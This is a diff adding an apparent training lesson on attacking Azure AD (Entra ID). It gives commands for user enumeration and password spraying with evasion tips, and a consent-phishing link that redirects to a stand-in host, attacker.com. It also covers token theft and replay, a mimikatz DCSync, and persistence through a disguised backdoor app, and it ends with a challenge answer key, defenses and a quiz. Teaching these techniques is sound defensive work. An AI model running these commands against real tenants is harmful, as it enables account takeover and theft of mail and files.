@@ -1,0 +1,319 @@
+---
+title: "Azure AD Attacks"
+description: "Learn to identify and exploit Azure Active Directory misconfigurations and vulnerabilities."
+difficulty: "Advanced"
+estimatedTime: "55 minutes"
+tags: ["cloud-security", "azure", "azure-ad", "identity"]
+---
+
+# Azure AD Attacks
+
+<InfoBox type="tip" title="The Kingdom Keys">
+Azure Active Directory (now Microsoft Entra ID) is the identity backbone of Microsoft 365 and Azure. Compromise Azure AD = Compromise everything.
+</InfoBox>
+
+## Understanding Azure AD
+
+**Azure AD** (Entra ID) manages identities for:
+- Microsoft 365 (Email, Teams, SharePoint)
+- Azure cloud resources
+- Thousands of SaaS apps
+- On-premises systems (via sync)
+
+### Key Components
+
+| Component | Description |
+|-----------|-------------|
+| **Tenant** | Your organization's Azure AD instance |
+| **Users** | Employee and guest accounts |
+| **Groups** | Collections of users/devices |
+| **Applications** | Service principals for apps |
+| **Roles** | Permission sets (Global Admin, etc.) |
+| **Conditional Access** | Context-based access policies |
+
+---
+
+## Reconnaissance
+
+### Tenant Discovery
+
+<TerminalWindow title="Azure AD Enumeration">
+# Check if domain uses Azure AD
+# Method 1: DNS
+nslookup -type=TXT company.com
+# Look for: v=spf1 include:spf.protection.outlook.com
+
+# Method 2: OpenID Configuration
+curl https://login.microsoftonline.com/company.com/.well-known/openid-configuration
+
+# Method 3: GetCredentialType
+curl -X POST https://login.microsoftonline.com/common/GetCredentialType \
+    -H "Content-Type: application/json" \
+    -d '{"Username":"test@company.com"}'
+
+# Response tells you if:
+# - Domain exists
+# - User exists
+# - Federation is used
+</TerminalWindow>
+
+### User Enumeration
+
+<TerminalWindow title="User Discovery">
+# Office 365 user enumeration (pre-auth)
+# Tool: o365creeper
+python o365creeper.py -f emails.txt -o valid_users.txt
+
+# Azure AD user enumeration via Teams
+# If Teams is enabled, presence can leak user existence
+GET https://teams.microsoft.com/api/mt/user/presence?user=target@company.com
+
+# ROADtools for authenticated enum
+roadrecon auth -u user@company.com -p password
+roadrecon gather
+roadrecon gui
+</TerminalWindow>
+
+---
+
+## Common Attack Vectors
+
+### 1. Password Spraying
+
+<TerminalWindow title="Azure AD Password Spray">
+# Use MSOLSpray
+Import-Module MSOLSpray.ps1
+Invoke-MSOLSpray -UserList users.txt -Password "Spring2026!"
+
+# Or use SprayCharles (Python)
+python spraycharles.py -u users.txt -p passwords.txt --url https://login.microsoft.com
+
+# Smart spraying tips:
+# - Use 1 password per 30+ minutes (avoid lockout)
+# - Use seasonal passwords: Summer2026!, Welcome123!
+# - Target off-hours when admins aren't watching
+</TerminalWindow>
+
+### 2. OAuth Consent Phishing
+
+Create a malicious app that requests excessive permissions:
+
+<TerminalWindow title="Illicit Consent Attack">
+# Attacker creates Azure app with permissions:
+# - Mail.Read
+# - Files.Read
+# - User.Read
+
+# Generates phishing link:
+https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
+    client_id=ATTACKER_APP_ID
+    &response_type=code
+    &redirect_uri=https://attacker.com/callback
+    &scope=openid%20Mail.Read%20Files.Read
+
+# Victim clicks → Grants access → Attacker reads email/files
+</TerminalWindow>
+
+### 3. Token Theft & Replay
+
+<TerminalWindow title="Azure AD Token Attacks">
+# Steal tokens from browser
+# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage
+
+# Steal refresh tokens
+# Location: %LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin...
+
+# Using TokenTactics
+Import-Module TokenTactics.ps1
+
+# Refresh token to access token
+Invoke-RefreshToAzureToken -RefreshToken $token
+
+# Access token replay
+$headers = @{ Authorization = "Bearer $accessToken" }
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
+</TerminalWindow>
+
+### 4. Azure AD Connect Abuse
+
+If on-premises AD syncs with Azure AD:
+
+<TerminalWindow title="AZUREADSSOACC Attack">
+# Azure AD Connect creates a computer account: AZUREADSSOACC$
+# Its password can decrypt Kerberos tickets for cloud SSO
+
+# Step 1: Get AZUREADSSOACC$ hash via DCSync
+mimikatz # lsadump::dcsync /domain:corp.com /user:AZUREADSSOACC$
+
+# Step 2: Create Silver Ticket for Azure AD
+# Can now authenticate to Azure as any synced user!
+
+# Defense: Rotate this account password every 30 days
+</TerminalWindow>
+
+---
+
+## Post-Exploitation
+
+### Privilege Escalation
+
+<TerminalWindow title="Azure AD Role Escalation">
+# High-value roles to target:
+# - Global Administrator (God mode)
+# - Privileged Role Administrator (can grant any role)
+# - Application Administrator (app secret rotation)
+# - Cloud App Administrator
+
+# Using AzureAD PowerShell
+Connect-AzureAD
+Get-AzureADDirectoryRole | Where-Object { $_.DisplayName -like "*Admin*" }
+
+# Using Microsoft Graph
+GET https://graph.microsoft.com/v1.0/directoryRoles
+GET https://graph.microsoft.com/v1.0/users/{id}/memberOf
+</TerminalWindow>
+
+### Persistence Mechanisms
+
+<TerminalWindow title="Azure AD Persistence">
+# 1. Add yourself to Global Admins
+Add-AzureADDirectoryRoleMember -ObjectId $roleId -RefObjectId $attackerId
+
+# 2. Create backdoor application
+$app = New-AzureADApplication -DisplayName "Backup Service"
+$secret = New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId
+# Grant app permissions, use client_credentials for access
+
+# 3. Federation trust abuse
+# If you compromise AD FS, you can issue tokens for any user
+
+# 4. PIM activation (temporary but useful)
+Invoke-AzureADPIM -RoleId $globalAdminRoleId -Action "activate"
+</TerminalWindow>
+
+---
+
+## Tools of the Trade
+
+| Tool | Purpose |
+|------|---------|
+| **ROADtools** | Azure AD recon and visualization |
+| **AzureHound** | BloodHound data collection for Azure |
+| **MSOLSpray** | Password spraying |
+| **TokenTactics** | Token theft and manipulation |
+| **AADInternals** | Comprehensive Azure AD toolkit |
+| **GraphRunner** | Post-exploitation via Graph API |
+
+<TerminalWindow title="Using AzureHound">
+# Install
+go install github.com/bloodhoundad/azurehound@latest
+
+# Authenticate
+azurehound -u user@company.com configure
+
+# Collect all data
+azurehound -o output.json list --tenant company.com
+
+# Import to BloodHound
+# Visualize attack paths to Global Admin!
+</TerminalWindow>
+
+---
+
+<ChallengeBox 
+  title="Azure AD Attack Chain"
+  difficulty="hard"
+  points={250}
+>
+
+You've captured a valid Azure AD access token for a regular user. The token was extracted from a Teams browser session.
+
+**Given**:
+```
+Token Claims:
+- aud: https://graph.microsoft.com
+- roles: []
+- scp: "User.Read Mail.Read"
+```
+
+**Questions**:
+1. What data can you access with this token?
+2. How would you check if the user has any privileged roles?
+3. What's your first escalation attempt?
+
+<details>
+<summary>Answer</summary>
+
+**1. Accessible Data** (based on scope):
+- User profile: `GET /me`
+- User's emails: `GET /me/messages`
+- Cannot access other users, files, or admin functions
+
+**2. Check Privileged Roles**:
+```bash
+curl -H "Authorization: Bearer $TOKEN" \
+    "https://graph.microsoft.com/v1.0/me/memberOf"
+
+# Look for directoryRole objects
+# Check displayName for "Admin" roles
+```
+
+**3. Escalation Attempts**:
+1. Check app registrations owned by user
+2. Look for sensitive group memberships
+3. Search emails for passwords/secrets
+4. Check for OAuth apps user has consented to
+5. If Hybrid, check for on-prem admin access
+
+```bash
+# Search emails for passwords
+curl -H "Authorization: Bearer $TOKEN" \
+    "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password\""
+```
+
+</details>
+</ChallengeBox>
+
+---
+
+## Defense & Detection
+
+### Monitor These Events
+
+| Event | Indication |
+|-------|------------|
+| Multiple failed logins from same IP | Password spraying |
+| Risky sign-ins (unusual location) | Compromised account |
+| New app consent | Consent phishing |
+| Role assignment changes | Privilege escalation |
+| New federation trust | Major compromise |
+
+### Protect Your Tenant
+
+1. **Enable MFA** for all users (ideally passwordless)
+2. **Conditional Access** - require compliant devices
+3. **PIM** - Just-in-time admin access
+4. **Block legacy auth** - Disable SMTP, POP, IMAP
+5. **Admin accounts** - Dedicated, cloud-only, MFA
+
+---
+
+## Key Takeaways
+
+- Azure AD is a **prime target** - controls cloud + on-prem
+- **Password spraying** is still highly effective
+- **OAuth consent phishing** bypasses MFA
+- Use **ROADtools** and **AzureHound** for enumeration
+- **MFA + Conditional Access** are critical defenses
+
+<Quiz
+  question="Which Azure AD attack can bypass MFA by tricking users into granting app permissions?"
+  options={[
+    "Password spraying",
+    "OAuth consent phishing (illicit consent)",
+    "Golden SAML",
+    "Kerberoasting"
+  ]}
+  correctIndex={1}
+  explanation="OAuth consent phishing tricks users into granting an attacker-controlled application access to their data. Once consent is granted, the attacker's app can access the data using its own credentials, bypassing MFA."
+/>
